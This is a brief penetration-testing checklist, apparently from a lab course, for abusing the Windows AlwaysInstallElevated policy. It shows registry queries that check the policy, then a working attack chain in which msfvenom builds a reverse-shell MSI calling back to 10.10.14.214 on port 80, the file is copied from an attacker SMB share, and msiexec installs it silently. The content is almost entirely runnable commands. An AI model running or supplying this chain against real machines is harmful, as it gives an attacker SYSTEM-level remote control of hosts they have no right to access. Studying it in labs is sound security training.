- [ ] Check The Registry Keys
- [ ] Exploitation 

Check The Registry Keys!!!
```powershell
reg.exe query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg.exe query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Exploitation!!!
```sh
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.214 lport=80 -f msi > aie.msi 

copy \\10.10.14.214\share\aie.msi .

msiexec /i c:\users\htb-student\aie.msi /quiet /qn /norestart
```
